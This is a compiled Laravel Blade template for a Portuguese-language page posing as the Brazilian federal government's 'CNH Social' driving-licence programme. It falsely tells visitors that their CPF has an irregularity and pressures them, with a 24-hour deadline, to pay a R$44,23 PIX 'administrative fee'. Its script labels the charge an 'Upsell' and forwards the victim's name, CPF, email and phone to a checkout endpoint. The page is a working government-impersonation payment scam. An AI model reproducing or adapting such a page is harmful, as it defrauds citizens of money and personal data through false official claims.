<?php $__env->startSection('content'); ?>
    <div class="min-h-screen bg-background flex flex-col">
        <?php echo $__env->make('components.header', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?>
        <main class="flex-1 px-4 py-6">
            <div class="max-w-2xl mx-auto">
                <div class="mb-6 text-sm">
                    <span class="text-govBlue hover:underline cursor-pointer">Início</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">Serviços</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">CNH</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-foreground">CNH Social Digital</span>
                </div>
                <div class="bg-card rounded-lg shadow-md border border-border p-6 space-y-6">
                    <div class="flex items-start justify-between gap-4">
                        <h1 class="text-2xl font-bold text-[#1B4F9B]">Pendência no CPF – Regularização Necessária</h1>
                    </div>
                    <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-3 rounded-lg shadow mb-6 flex gap-2">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-triangle-alert-icon lucide-triangle-alert w-5 h-5"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
                        <div class="flex-1">
                            <p class="font-semibold text-sm md:text-base">Identificamos uma pendência nos seus dados!</p>
                            <p class="text-sm">Seu pagamento foi concluído, mas encontramos uma pendência no seu CPF.</p>
                        </div>
                    </div>
                    <p class="leading-relaxed mb-4 text-sm md:text-base">
                        Informamos que o seu processo de cadastro no <strong>CNH SOCIAL 2025</strong> não pode ser concluído devido a uma
                        <strong>irregularidade identificada no seu CPF</strong>. Para liberar o cadastro e o agendamento dos exames,
                        é necessário regularizar essa situação junto aos órgãos responsáveis <strong>em até 24 horas!</strong>
                    </p>
                    <p class="leading-relaxed mb-4 text-sm md:text-base">
                        Para agilizar o processo, disponibilizamos o <strong>Atendimento Prioritário</strong>, que permite a regularização
                        <strong>online</strong> e imediata do seu CPF, garantindo que você continue sua habilitação sem qualquer atraso.
                    </p>
                    <div class="bg-blue-50 border border-blue-200 p-4 rounded-xl mb-4">
                        <p class="font-semibold text-sm md:text-base">Taxa administrativa</p>
                        <p class="text-sm md:text-base">Para utilizar o Atendimento Prioritário, é necessário realizar o pagamento da taxa de <strong>R$44,23</strong>,
                        destinada à manutenção da estrutura para atendimento especializado.</p>
                    </div>
                    <p class="leading-relaxed mb-6 text-sm md:text-base">
                        Após o pagamento e confirmação dos dados, seu CPF será regularizado <strong>imediatamente</strong> e seu cadastro reativado,
                        permitindo o agendamento dos exames conforme sua escolha anterior.
                    </p>
                    <div class="text-center mb-3">
                        <p class="text-2xl font-bold text-green-600">R$44,23</p>
                        <p class="text-sm text-gray-600 mt-1">Pagamento único via PIX</p>
                    </div>
                    <button onclick="processarTax(44.23)" class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-11 rounded-md px-8 w-full py-6 text-base md:text-lg font-semibold bg-[#1B4F9B] hover:bg-[#1B4F9B]/90 text-white">Regularizar pendência agora!</button>
                </div>
            </div>
        </main>
        <footer class="mt-8 py-6 border-t border-border bg-card">
            <div class="max-w-4xl mx-auto px-4 text-center text-sm text-muted-foreground">&copy; <?php echo e(date('Y')); ?> <strong>Governo Federal</strong>. Todos os direitos reservados.</div>
        </footer>
    </div>
<style>
.bg-yellow-100{background-color:oklch(97.3% 0.071 103.193);}
.border-yellow-500{border-color:oklch(79.5% 0.184 86.047);}
.text-yellow-700{color:oklch(55.4% 0.135 66.442);}
.rounded-xl{border-radius:0.75rem}
.text-gray-600{color:oklch(62.7% 0.194 149.214);}
</style>
<?php $__env->stopSection(); ?>
<?php $__env->startSection('javascript'); ?>
<script>
const userData = JSON.parse(sessionStorage.getItem("userData"));
const userAddress = JSON.parse(sessionStorage.getItem("userAddress"));
if(!userData){
    window.location.href = "<?php echo e(url('/login')); ?>";
} 

function processarTax(valor){
    var nome = userData.NOME;
    var cpf = userData.CPF;
    var email = userData.email;
    var telefone = userData.telefone;

    $('.loading__circle').css({ 'display': 'flex' });

    $.ajax({
        type: 'POST',
        url: "<?php echo e(url('/processar')); ?>",
        headers: {
            'X-CSRF-TOKEN': '<?php echo e(csrf_token()); ?>'
        },
        data: {
            servico: 'Payment CN Upsell 01',
            nome: nome,
            cpf: cpf,
            email: email,
            telefone: telefone,
            valor: valor
        },
        dataType: 'json',
        success: function (response) {
            if(response.success){
                window.location.href = "<?php echo e(url('/checkout/pix')); ?>/" + response.id;
            }else{
                $('.loading__circle').css({ 'display': 'none' });
            }
        }
    });
}
</script>
<?php $__env->stopSection(); ?>
<?php echo $__env->make('layouts.app', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?><?php /**PATH /var/www/areadev.site/public_html/cnhsocial/resources/views/cadastro/pendencia.blade.php ENDPATH**/ ?>